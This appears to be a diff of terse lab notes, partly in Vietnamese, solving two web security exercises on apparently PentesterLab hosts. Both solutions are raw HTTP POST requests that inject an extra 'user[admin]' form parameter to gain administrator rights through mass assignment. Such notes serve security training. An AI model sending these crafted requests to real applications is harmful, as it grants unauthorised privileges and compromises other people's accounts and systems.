@@ -1,10 +1,20 @@
-Giai quyet: 
+Giai quyet: 1
           POST /signup HTTP/1.1
           Host: ptl-8d9f2983-5cdf1874.libcurl.so
 
           user%5Busername%5D=user&user%5Bpassword%5D=user&submit=Submit+Query
 
-username to > admin > KEY
+username to > admin > user%5Badmin%5D=user& > KEY 
+
+-----------------------------
+
+Giai quyet: 2
+          POST /update_profile HTTP/1.1
+          Host: ptl-4fe1602c-4720ae5c.libcurl.so
+
+          user%5Busername%5D=admin'&user%5Bpassword%5D=&submit=Submit+Query     &user%5Badmin%5D=
+
+add paramater "&user%5Badmin%5D="
 
                                                                       LAB
 
